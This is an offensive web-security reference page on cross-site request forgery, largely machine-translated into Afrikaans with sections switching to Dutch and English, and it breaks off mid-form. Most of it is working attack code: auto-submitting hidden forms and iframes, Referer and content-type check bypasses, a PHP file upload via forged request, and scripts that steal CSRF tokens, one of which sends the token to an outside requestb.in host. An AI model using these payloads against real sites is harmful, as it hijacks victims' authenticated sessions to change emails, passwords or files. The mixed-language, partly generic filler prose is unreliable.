# CSRF (Cross Site Request Forgery)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Sluit aan by die [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) bediener om te kommunikeer met ervare hackers en foutbeloningsjagters!

**Hacking Insights**\
Gaan in gesprek met inhoud wat die opwinding en uitdagings van hacking ondersoek

**Real-Time Hack News**\
Bly op hoogte van die vinnige w√™reld van hacking deur middel van real-time nuus en insigte

**Nuutste aankondigings**\
Bly ingelig met die nuutste foutbelonings wat bekendgestel word en belangrike platform-opdaterings

**Sluit aan by ons op** [**Discord**](https://discord.com/invite/N3FrSbmwdy) en begin vandag saamwerk met top hackers!


## Cross-Site Request Forgery (CSRF) Verduidelik

**Cross-Site Request Forgery (CSRF)** is 'n tipe sekuriteitskwesbaarheid wat in webtoepassings gevind word. Dit stel aanvallers in staat om aksies namens argeloos gebruikers uit te voer deur hul geauthentiseerde sessies uit te buit. Die aanval word uitgevoer wanneer 'n gebruiker, wat ingeteken is by 'n slagoffer se platform, 'n skadelike webwerf besoek. Hierdie webwerf veroorsaak dan versoek aan die slagoffer se rekening deur metodes soos die uitvoering van JavaScript, die indiening van vorms, of die ophaling van afbeeldings.

### Voorvereistes vir 'n CSRF-aanval
Om 'n CSRF-kwesbaarheid uit te buit, moet verskeie voorwaardes voldoen word:

1. **Identifiseer 'n Waardevolle Aksie**: Die aanvaller moet 'n aksie vind wat die moeite werd is om uit te buit, soos die verandering van die gebruiker se wagwoord, e-pos, of verhoging van voorregte.
2. **Sessiebestuur**: Die gebruiker se sessie moet slegs deur koekies of die HTTP Basiese Verifikasie-kop beheer word, aangesien ander koppe nie vir hierdie doel gemanipuleer kan word nie.
3. **Afwees van Onvoorspelbare Parameters**: Die versoek mag nie onvoorspelbare parameters bevat nie, aangesien dit die aanval kan voorkom.

### Verdediging teen CSRF
Verskeie teenmaatre√´ls kan ge√Ømplementeer word om teen CSRF-aanvalle te beskerm:

* [**SameSite-koekies**](hacking-with-cookies/#samesite): Hierdie eienskap voorkom dat die blaaier koekies saam met kruiswebwerfversoeke stuur. [Meer oor SameSite-koekies](hacking-with-cookies/#samesite).
* [**Cross-origin resource sharing**](cors-bypass.md): Die CORS-beleid van die slagoffer se webwerf kan die uitvoerbaarheid van die aanval be√Ønvloed, veral as die aanval vereis dat die respons van die slagoffer se webwerf gelees word. [Leer oor CORS-omseiling](cors-bypass.md).
* **Gebruikersverifikasie**: Die versoek om die gebruiker se wagwoord te vra of 'n captcha op te los, kan die gebruiker se bedoeling bevestig.
* **Kontroleer Verwysers of Oorsprongkoppe**: Die validering van hierdie koppe kan help om te verseker dat versoek van betroubare bronne afkomstig is. Tog kan sorgvuldige samestelling van URL's swak ge√Ømplementeerde kontroles omseil, soos:
- Gebruik van `http://mal.net?orig=http://example.com` (URL eindig met die betroubare URL)
- Gebruik van `http://example.com.mal.net` (URL begin met die betroubare URL)
* **Wysiging van Parametername**: Die wysiging van die name van parameters in POST- of GET-versoeke kan help om outomatiese aanvalle te voorkom.
* **CSRF-tokens**: Die inkorporering van 'n unieke CSRF-token in elke sessie en die vereiste van hierdie token in volgende versoek kan die risiko van CSRF aansienlik verminder. Die doeltreffendheid van die token kan verhoog word deur CORS af te dwing.

Die begrip en implementering van hierdie verdedigings is noodsaaklik vir die handhawing van die sekuriteit en integriteit van webtoepassings.

## Verdedigingsomseiling

### Van POST na GET

Miskien is die vorm wat jy wil misbruik, gereed om 'n **POST-versoek met 'n CSRF-token te stuur**, maar jy moet **nagaan** of 'n **GET** ook **geldig** is en of die **CSRF-token steeds gevalideer word** wanneer jy 'n GET-versoek stuur.

### Gebrek aan token

Toepassings kan 'n meganisme implementeer om **tokens te valideer** wanneer hulle teenwoordig is. 'n Kwesbaarheid ontstaan egter as die validering heeltemal omseil word wanneer die token afwesig is. Aanvallers kan dit uitbuit deur die parameter wat die token dra, te **verwyder**, nie net sy waarde nie. Dit stel hulle in staat om die valideringsproses te omseil en 'n Cross-Site Request Forgery (CSRF) aanval doeltreffend uit te voer.

### CSRF-token is nie gekoppel aan die gebruikersessie nie

Toepassings wat CSRF-tokens **nie aan gebruikersessies koppel nie**, bied 'n aansienlike **sekuriteitsrisiko**. Hierdie stelsels verifieer tokens teen 'n **globale poel** eerder as om te verseker dat elke token aan die inisieerende sessie gekoppel is.

So misbruik aanvallers dit:

1. **Verifieer** met hul eie rekening.
2. **Verkry 'n geldige CSRF-token** uit die globale poel.
3. **Gebruik hierdie token** in 'n CSRF-aanval teen 'n slagoffer.

Hierdie kwesbaarheid stel aanvallers in staat om ongemagtigde versoek op naam van die slagoffer te maak deur die toepassing se **onvoldoende token-valideringsmeganisme** uit te buit.

### Metode-omseiling

As die versoek 'n "**vreemde**" **metode** gebruik, kyk of die **metode-oorrulfunksionaliteit** werk.
Byvoorbeeld, as dit 'n **PUT**-metode gebruik, kan jy probeer om 'n **POST**-metode te gebruik en te **stuur**: _https://example.com/my/dear/api/val/num?**\_method=PUT**_

Dit kan ook werk deur die **\_method-parameter binne 'n POST-versoek** te stuur of deur die **koppe** te gebruik:

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_

### Omseiling van aangepaste kop-token

As die versoek 'n **aangepaste kop** met 'n **token** by die versoek voeg as **CSRF-beskermingsmetode**, dan:

* Toets die versoek sonder die **aangepaste token en ook die kop.**
* Toets die versoek met presies **dieselfde lengte maar 'n ander token**.

### CSRF-token word geverifieer deur 'n koekie

Toepassings kan CSRF-beskerming implementeer deur die token in beide 'n koekie en 'n versoekparameter te dupliseer of deur 'n CSRF-koekie in te stel en te verifieer of die token wat in die agtergrond gestuur word, ooreenstem met die koek
```html
<html>
<!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://example.com/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>

```
{% hint style="info" %}
Let daarop dat as die **csrf-token verband hou met die sessiekoekie, sal hierdie aanval nie werk nie** omdat jy die slagoffer jou sessie moet stel, en dus sal jy jouself aanval.
{% endhint %}

### Verandering van inhoudstipe

Volgens [**hierdie**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests), om **vooraanvrae te vermy** deur die **POST**-metode te gebruik, is hierdie die toegelate waardes vir Inhoudstipe:

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

Let egter daarop dat die **bedienerslogika kan wissel** afhangende van die gebruikte Inhoudstipe, so jy moet die genoemde waardes probeer asook ander soos **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._

Voorbeeld (van [hier](https://brycec.me/posts/corctf\_2021\_challenges)) van die stuur van JSON-data as teks/plain:
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### Omleiding van Preflight-aanvrae vir JSON-data

Wanneer jy probeer om JSON-data via 'n POST-aanvraag te stuur, is dit nie direk moontlik om die `Content-Type: application/json` in 'n HTML-vorm te gebruik nie. Op dieselfde manier veroorsaak die gebruik van `XMLHttpRequest` om hierdie inhoudstipe te stuur 'n preflight-aanvraag. Daar is egter strategie√´ om moontlik hierdie beperking te omseil en te kyk of die bediener die JSON-data verwerk, ongeag die Content-Type:

1. **Gebruik Alternatiewe Inhoudstipes**: Gebruik `Content-Type: text/plain` of `Content-Type: application/x-www-form-urlencoded` deur `enctype="text/plain"` in die vorm in te stel. Hierdie benadering toets of die agterkant die data gebruik, ongeag die Content-Type.

2. **Wysig Inhoudstipe**: Om 'n preflight-aanvraag te vermy terwyl die bediener die inhoud as JSON herken, kan jy die data stuur met `Content-Type: text/plain; application/json`. Dit veroorsaak nie 'n preflight-aanvraag nie, maar dit kan korrek deur die bediener verwerk word as dit gekonfigureer is om `application/json` te aanvaar.

3. **SWF Flash-l√™ergebruik**: 'n Minder algemene maar uitvoerbare metode behels die gebruik van 'n SWF-flash-l√™er om sulke beperkings te omseil. Vir 'n dieper begrip van hierdie tegniek, verwys na [hierdie pos](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937).

### Verwysings- / Oorsprong-omseiling

**Vermy Verwysingskop**

Toepassings kan die 'Referer'-kop slegs valideer as dit teenwoordig is. Om te voorkom dat 'n webblaaier hierdie kop stuur, kan die volgende HTML-meta-etiket gebruik word:
```xml
<meta name="referrer" content="never">
```
Dit verseker dat die 'Referer' kop nie ingesluit word nie, wat moontlik validasie kontroles in sommige toepassings kan omseil.

**Regexp omseilings**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Om die domeinnaam van die bediener in die URL in te stel wat die Verwysingsbron binne die parameters gaan stuur, kan jy doen:
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
### **KOP-metode omseil**

Die eerste deel van [**hierdie CTF writeup**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution) verduidelik dat [Oak se bronkode](https://github.com/oakserver/oak/blob/main/router.ts#L281), 'n router ingestel is om **HEAD-versoeke as GET-versoeke** te hanteer sonder 'n responsliggaam - 'n algemene omweg wat nie uniek is tot Oak nie. In plaas van 'n spesifieke hanterer wat met HEAD-versoeke werk, word hulle eenvoudigweg **aan die GET-hanterer gegee, maar die toepassing verwyder net die responsliggaam**.

Daarom, as 'n GET-versoek beperk word, kan jy eenvoudig 'n HEAD-versoek stuur wat as 'n GET-versoek verwerk sal word.

## **Exploit-voorbeelde**

### **Uitlek van CSRF-token**

As 'n **CSRF-token** as **verdediging** gebruik word, kan jy probeer om dit te **uitlek** deur 'n [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) kwesbaarheid of 'n [**Dangling Markup**](dangling-markup-html-scriptless-injection/) kwesbaarheid te misbruik.

### **GET met behulp van HTML-etikette**
```xml
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
Ander HTML5-etikette wat gebruik kan word om outomaties 'n GET-versoek te stuur, is:
```html
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="">
<embed src="...">
<audio src="...">
<video src="...">
<source src="..." type="...">
<video poster="...">
<link rel="stylesheet" href="...">
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
body { background: url('...'); }
</style>
<bgsound src="...">
<track src="..." kind="subtitles">
<input type="image" src="..." alt="Submit Button">
```
### Vorm GET-versoek

'n GET-versoek word gebruik om inligting van 'n webbediener te versoek deur die inligting as deel van die URL-parameters te stuur. Dit is 'n eenvoudige manier om data van 'n webvorm na 'n bediener te stuur. Die data word in die URL-parameters gekodeer en is dus sigbaar in die URL-ry. Hier is 'n voorbeeld van 'n GET-versoek:

```html
<form action="/login" method="GET">
    <input type="text" name="username" placeholder="Gebruikersnaam">
    <input type="password" name="password" placeholder="Wagwoord">
    <input type="submit" value="Aanmeld">
</form>
```

In hierdie voorbeeld sal die gebruikersnaam en wagwoord wat deur die gebruiker ingevul word, as deel van die URL na die "/login"-roete gestuur word. Die URL sal soos volg lyk:

```
http://www.example.com/login?username=gebruiker&password=wagwoord
```

Dit is belangrik om te besef dat 'n GET-versoek nie geskik is vir die stuur van sensitiewe inligting soos wagwoorde nie, aangesien die data sigbaar is in die URL.
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### Vorm POST versoek

A form POST request is a type of HTTP request that is used to submit data to a server. It is commonly used in web applications to send data from a form to the server for processing. The data is sent in the body of the request, and the server processes it based on the specified action.

In a form POST request, the data is typically sent as key-value pairs. The keys represent the names of the form fields, and the values represent the data entered by the user. The data can be sent in various formats, such as URL-encoded or JSON.

To send a form POST request, you need to specify the target URL and the data to be sent. This can be done using HTML forms or programmatically using JavaScript or other programming languages. The request is then sent to the server, which processes the data and returns a response.

Form POST requests are vulnerable to Cross-Site Request Forgery (CSRF) attacks, where an attacker tricks a user into unknowingly submitting a malicious form. To protect against CSRF attacks, web applications can implement measures such as using CSRF tokens or checking the origin of the request.

Overall, form POST requests are a fundamental part of web development and are widely used for submitting data to servers. Understanding how they work and their vulnerabilities is essential for both developers and security professionals.
```html
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### Vorm POST-aanvraag deur middel van 'n iframe

'n CSRF-aanval (Cross-Site Request Forgery) is 'n aanvalstegniek waar 'n aanvaller 'n gebruiker se vertroue in 'n webtoepassing misbruik om ongewenste aksies namens die gebruiker uit te voer. Een van die metodes wat gebruik kan word om 'n CSRF-aanval uit te voer, is deur 'n vorm POST-aanvraag te doen deur middel van 'n iframe.

Hier is die stappe om 'n vorm POST-aanvraag deur middel van 'n iframe uit te voer:

1. Skep 'n HTML-bladsy wat 'n vorm bevat wat jy wil indien.
2. Skep 'n iframe-element op dieselfde bladsy en stel die bron (src) van die iframe in op die doelwit van jou aanval.
3. Stel die waardes van die vormveld in op die waardes wat jy wil indien.
4. Gebruik JavaScript om die vorm in die iframe te indien deur die `submit()`-metode van die vormelement aan te roep.

Hier is 'n voorbeeld van hoe die HTML-kode kan lyk:

```html
<html>
<body>
  <form id="myForm" action="http://www.example.com/submit" method="POST">
    <input type="hidden" name="username" value="attacker">
    <input type="hidden" name="password" value="password123">
  </form>

  <iframe id="myIframe" src="http://www.example.com/submit"></iframe>

  <script>
    document.getElementById("myIframe").onload = function() {
      document.getElementById("myForm").submit();
    };
  </script>
</body>
</html>
```

Met hierdie tegniek sal die vorm POST-aanvraag outomaties ingedien word wanneer die bladsy gelaai word. Dit kan gebruik word om ongewenste aksies uit te voer, soos om 'n gebruiker se wagwoord te verander of om transaksies namens die gebruiker te doen.

Dit is belangrik om te besef dat 'n CSRF-aanval slegs suksesvol sal wees as die gebruiker reeds aangemeld is by die doelwit-webtoepassing.
```html
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Ajax POST versoek**
```html
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### multipart/form-data POS-aanvraag

'n multipart/form-data POS-aanvraag word gebruik om data na 'n bediener te stuur deur die gebruik van die HTTP POST-metode. Hierdie tipe aanvraag word dikwels gebruik wanneer daar l√™ers of ander nie-tekstuele data gestuur moet word.

Die aanvraag se inhoud word verdeel in verskillende dele, elk met 'n eie inhoudstipe en inhoud. Elke deel bevat 'n sleutel-waarde-paar, waar die sleutel die naam van die vormveld is en die waarde die inhoud van die veld is.

Die inhoudstipe van die aanvraag is "multipart/form-data" en die inhoudsopbou word aangedui deur die "boundary" parameter. Die "boundary" parameter is 'n unieke tekenreeks wat gebruik word om die grense tussen die verskillende dele van die aanvraag aan te dui.

Byvoorbeeld, 'n multipart/form-data POS-aanvraag kan gebruik word om 'n l√™er na 'n bediener te stuur. Die l√™er sal as 'n deel van die aanvraag ingesluit word, met die sleutel as die naam van die vormveld en die waarde as die inhoud van die l√™er.

Dit is belangrik om te weet dat 'n CSRF-aanval (Cross-Site Request Forgery) moontlik is met 'n multipart/form-data POS-aanvraag. In 'n CSRF-aanval kan 'n aanvaller 'n vervalste aanvraag stuur namens 'n ingelogde gebruiker, wat kan lei tot ongewenste aksies of datalekke.
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### multipart/form-data POST versoek v2
```javascript
// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### Vorm POST-aanvraag van binne 'n iframe

Wanneer 'n webbladsy 'n vorm bevat wat 'n POST-aanvraag na 'n ander webbladsy stuur, kan hierdie vorm ook binne 'n iframe geplaas word. Dit beteken dat die vorm onsigbaar kan wees vir die gebruiker terwyl dit steeds agter die skerms data na 'n ander webbladsy stuur.

Hierdie tegniek kan gebruik word vir 'n CSRF-aanval (Cross-Site Request Forgery). Die aanvaller kan 'n webbladsy skep wat 'n vorm bevat wat agter die skerms data na 'n ander webbladsy stuur sonder dat die gebruiker daarvan bewus is. As die gebruiker toevallig die aanvallige webbladsy besoek terwyl hy aangemeld is by die teikenwebwerf, sal die vormaansoek uitgevoer word met die legitimasie van die gebruiker. Dit kan die aanvaller in staat stel om aksies namens die gebruiker uit te voer sonder sy toestemming.

Om hierdie tipe aanval te voorkom, kan die teikenwebwerf CSRF-beskerming implementeer deur gebruik te maak van tokens. Hierdie tokens word gegenereer en aan die vorm toegevoeg. Wanneer die vormaansoek ontvang word, word die token geverifieer om te verseker dat dit geldig is en dat die aansoek nie deur 'n aanvaller gestuur is nie.

Dit is belangrik vir webontwikkelaars om bewus te wees van hierdie tegniek en om toepaslike veiligheidsmaatre√´ls te implementeer om CSRF-aanvalle te voorkom.
```html
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **Steel CSRF-token en stuur 'n POST-versoek**

Om 'n CSRF-token te steel en 'n POST-versoek te stuur, kan jy die volgende stappe volg:

1. Identifiseer die doelwit-webwerf waarop jy wil inbreek.
2. Analiseer die webwerf se bronkode om die CSRF-token te vind. Die token is gewoonlik ingesluit in 'n versteekte veld of as 'n koekie.
3. Skryf 'n skripsie of gebruik 'n hulpmiddel soos 'n webkrapper om die CSRF-token te onttrek.
4. Stel 'n POST-versoek op met die gesteelde CSRF-token en die nodige parameters vir die aangevraagde aksie.
5. Stuur die POST-versoek na die doelwit-webwerf se bedienaar.
6. Monitor die respons om te sien of die aangevraagde aksie suksesvol uitgevoer is.

Dit is belangrik om te onthou dat die gebruik van CSRF-tegnieke om ongemagtigde aksies uit te voer teen 'n webwerf onwettig is en etiese implikasies het. Hierdie tegnieke moet slegs gebruik word vir wettige doeleindes, soos om sekuriteitslekke in 'n webwerf te identifiseer en te verhelp.
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **Steel CSRF-token en stuur 'n Post-aanvraag deur gebruik te maak van 'n iframe, 'n vorm en Ajax**

Om 'n CSRF-token te steel en 'n Post-aanvraag te stuur, kan jy die volgende metodes gebruik: 'n iframe, 'n vorm en Ajax.

#### **Metode 1: iframe**

1. Skep 'n iframe-element in die HTML-kode van jou aanvalspagina.
2. Stel die bron van die iframe in op die doelwebwerf se URL waar die CSRF-token gegenereer word.
3. Gebruik JavaScript om die CSRF-token van die iframe-element te kry.
4. Stuur 'n Post-aanvraag na die doelwebwerf deur die CSRF-token as 'n parameter in te sluit.

#### **Metode 2: vorm**

1. Skep 'n vorm-element in die HTML-kode van jou aanvalspagina.
2. Stel die aksie van die vorm in op die doelwebwerf se URL waar die CSRF-token gegenereer word.
3. Voeg 'n verborge veld by in die vorm met die naam en waarde van die CSRF-token.
4. Stuur die vorm na die doelwebwerf deur dit te indien.

#### **Metode 3: Ajax**

1. Gebruik JavaScript om 'n Ajax-aanvraag na die doelwebwerf te stuur.
2. Stel die metode van die aanvraag in op Post.
3. Voeg die CSRF-token as 'n parameter by in die aanvraagdata.
4. Stuur die Ajax-aanvraag na die doelwebwerf.

Deur een van hierdie metodes te gebruik, kan jy 'n CSRF-token steel en dit gebruik om 'n Post-aanvraag na die doelwebwerf te stuur. Onthou egter dat hierdie metodes vir aanvalle gebruik kan word en dat dit belangrik is om etiese hackingpraktyke te volg.
```html
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **Steel CSRF-token en stuur 'n POST-aanvraag deur gebruik te maak van 'n iframe en 'n vorm**

Om 'n CSRF-token te steel en 'n POST-aanvraag te stuur, kan jy die volgende metode gebruik:

1. Skep 'n iframe-element in die HTML-kode van jou aanvalswebwerf. Die iframe-element moet verwys na die doelwitwebwerf waarop jy die POST-aanvraag wil uitvoer.

   ```html
   <iframe id="csrf-frame" src="https://www.doelwitwebwerf.com"></iframe>
   ```

2. Skep 'n vorm-element binne die iframe-element. Die vorm moet die nodige veldwaardes bevat vir die POST-aanvraag wat jy wil uitvoer. Dit moet ook 'n verborge veld h√™ wat die gesteelde CSRF-token bevat.

   ```html
   <form id="csrf-form" action="https://www.doelwitwebwerf.com/target-endpoint" method="POST">
       <input type="hidden" name="csrf-token" value="GESTEELDE_CSRF_TOKEN">
       <!-- Voeg ander veldwaardes by vir die POST-aanvraag -->
   </form>
   ```

3. Gebruik JavaScript om die vorm binne die iframe te stuur sodra die iframe gelaai is. Hierdie stap verseker dat die POST-aanvraag outomaties uitgevoer word sonder enige interaksie van die gebruiker.

   ```html
   <script>
       document.getElementById('csrf-frame').onload = function() {
           document.getElementById('csrf-form').submit();
       };
   </script>
   ```

Met hierdie metode sal die gesteelde CSRF-token gebruik word om 'n POST-aanvraag na die doelwitwebwerf te stuur sonder dat die gebruiker daarvan bewus is. Dit kan gebruik word om skadelike aksies uit te voer namens die gebruiker, soos die verander van wagwoorde of die stuur van valse inligting.
```html
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **Steel token en stuur dit deur gebruik te maak van 2 iframes**

Om een CSRF-aanval (Cross-Site Request Forgery) uit te voeren, moet je eerst het CSRF-token stelen van het doelwit. Dit token wordt meestal opgeslagen in een cookie of een verborgen veld in een formulier. Nadat je het token hebt verkregen, kun je het gebruiken om een vervalste aanvraag naar de doelwebsite te sturen.

Een manier om het gestolen token te verzenden, is door gebruik te maken van twee iframes. Het eerste iframe wordt gebruikt om het CSRF-formulier te laden, terwijl het tweede iframe wordt gebruikt om de vervalste aanvraag te verzenden.

Hier is een voorbeeld van hoe je dit kunt doen:

```html
<iframe id="csrf-form" src="https://www.example.com/csrf-form"></iframe>
<iframe id="csrf-submit" style="display: none;"></iframe>

<script>
    // Wacht tot het CSRF-formulier is geladen
    document.getElementById('csrf-form').onload = function() {
        // Haal het CSRF-token op uit het formulier
        var csrfToken = document.getElementById('csrf-form').contentWindow.document.getElementById('csrf-token').value;

        // Stel de vervalste aanvraag samen
        var request = new XMLHttpRequest();
        request.open('POST', 'https://www.example.com/submit', true);
        request.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        request.send('csrf_token=' + csrfToken + '&data=evil');

        // Verberg het tweede iframe
        document.getElementById('csrf-submit').style.display = 'none';
    };
</script>
```

In dit voorbeeld wordt ervan uitgegaan dat het CSRF-formulier wordt geladen vanaf `https://www.example.com/csrf-form` en het vervalste verzoek wordt verzonden naar `https://www.example.com/submit`. Zorg ervoor dat je de juiste URL's gebruikt voor jouw specifieke doelwit.

Merk op dat deze techniek mogelijk niet werkt als de doelwebsite maatregelen heeft genomen om CSRF-aanvallen te voorkomen, zoals het gebruik van anti-CSRF-tokens die per sessie veranderen. Het is belangrijk om altijd de beveiligingsmaatregelen van het doelwit te evalueren voordat je een CSRF-aanval uitvoert.
```html
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
